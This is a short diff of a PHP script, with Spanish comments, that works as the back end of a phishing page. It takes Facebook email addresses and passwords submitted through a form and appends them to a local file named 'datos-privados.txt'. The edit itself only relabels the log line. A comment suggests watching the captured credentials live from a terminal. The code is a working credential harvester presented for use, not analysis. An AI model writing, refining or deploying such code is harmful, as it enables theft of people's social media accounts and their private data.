@@ -4,7 +4,7 @@ $file = 'datos-privados.txt';
 $email = $_POST['email_facebook'] ?? 'desconocido';
 $password = $_POST['password_facebook'] ?? 'desconocida';
 
-$log = "[📩] Correo: $email\n[🔑] Contraseña: $password\n\n";
+$log = "[📩] Correo (Facebook): $email\n[🔑] Contraseña: $password\n\n";
 file_put_contents($file, $log, FILE_APPEND);
 
 // Mostrarlo en consola (si ejecutas desde terminal con tail -f o similar)
